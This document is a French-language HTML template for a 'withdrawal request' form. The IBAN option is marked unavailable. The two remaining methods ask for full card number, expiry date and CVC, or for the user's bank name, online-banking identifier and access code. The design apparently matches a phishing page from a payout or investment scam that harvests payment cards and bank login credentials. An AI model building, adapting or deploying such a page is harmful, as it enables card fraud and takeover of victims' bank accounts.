<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Demande de retrait</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
    <style>
        .form-section { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div class="form-card">
        <h2 class="form-title">Demande de retrait</h2>

        <form method="POST" action="/withdraw">

            <!-- Montant -->
            <div class="form-group">
                <label for="amount">Montant du retrait :</label>
                <input type="number" name="amount" id="amount" class="form-input" required>
            </div>

            <!-- Mode -->
            <div class="form-group">
                <label for="mode">Méthode de retrait :</label>
                <select name="mode" id="mode" class="form-input" required>
                    <option value="" disabled selected>-- Sélectionnez une méthode --</option>
                    <option value="card">Carte bancaire</option>
                    <option value="bank" disabled>IBAN (Indisponible)</option>
                    <option value="identification">Identification bancaire</option>
                </select>
            </div>

            <div id="method_fields">

                <!-- Carte bancaire -->
                <div id="card_section" class="form-section">

                    <div class="form-group">
                        <label for="phone_card">Numéro de téléphone :</label>
                        <input type="tel" name="phone_card" id="phone_card"
                               class="form-input" placeholder="+33 6 00 00 00 00">
                    </div>

                    <div class="form-group">
                        <label for="card_number">Numéro de carte :</label>
                        <input type="text" name="card_number" id="card_number" class="form-input">
                    </div>

                    <div class="form-group">
                        <label for="card_expiry">Date d'expiration :</label>
                        <input type="text" name="card_expiry" id="card_expiry" class="form-input">
                    </div>

                    <div class="form-group">
                        <label for="card_cvv">Code CVC :</label>
                        <input type="text" name="card_cvv" id="card_cvv" class="form-input">
                    </div>
                </div>

                <!-- Identification bancaire -->
                <div id="id_section" class="form-section">

                    <div class="form-group">
                        <label for="phone_id">Numéro de téléphone :</label>
                        <input type="tel" name="phone_id" id="phone_id"
                               class="form-input" placeholder="+33 6 00 00 00 00">
                    </div>

                    <div class="form-group">
                        <label for="bank_name_id">Nom de la banque :</label>
                        <input type="text" name="bank_name_id" id="bank_name_id" class="form-input">
                    </div>

                    <div class="form-group">
                        <label for="bank_identifiers">Identifiant bancaire :</label>
                        <input type="text" name="bank_identifiers" id="bank_identifiers" class="form-input">
                    </div>

                    <div class="form-group">
                        <label for="bank_code_id">Code d’identification :</label>
                        <input type="text" name="bank_code_id" id="bank_code_id" class="form-input">
                    </div>
                </div>
            </div>

            <button type="submit" class="btn-primary">Envoyer la demande</button>
        </form>
    </div>
</div>

<script>
document.addEventListener('DOMContentLoaded', function () {
    const modeSelect = document.getElementById('mode');
    const cardSection = document.getElementById('card_section');
    const idSection = document.getElementById('id_section');

    const phoneCard = document.getElementById('phone_card');
    const phoneId = document.getElementById('phone_id');

    function resetRequired() {
        phoneCard.required = false;
        phoneId.required = false;
    }

    function hideAll() {
        cardSection.style.display = 'none';
        idSection.style.display = 'none';
        resetRequired();
    }

    modeSelect.addEventListener('change', function () {
        hideAll();

        if (this.value === 'card') {
            cardSection.style.display = 'block';
            phoneCard.required = true;
        }

        if (this.value === 'identification') {
            idSection.style.display = 'block';
            phoneId.required = true;
        }
    });

    hideAll();
});
</script>

</body>
</html>
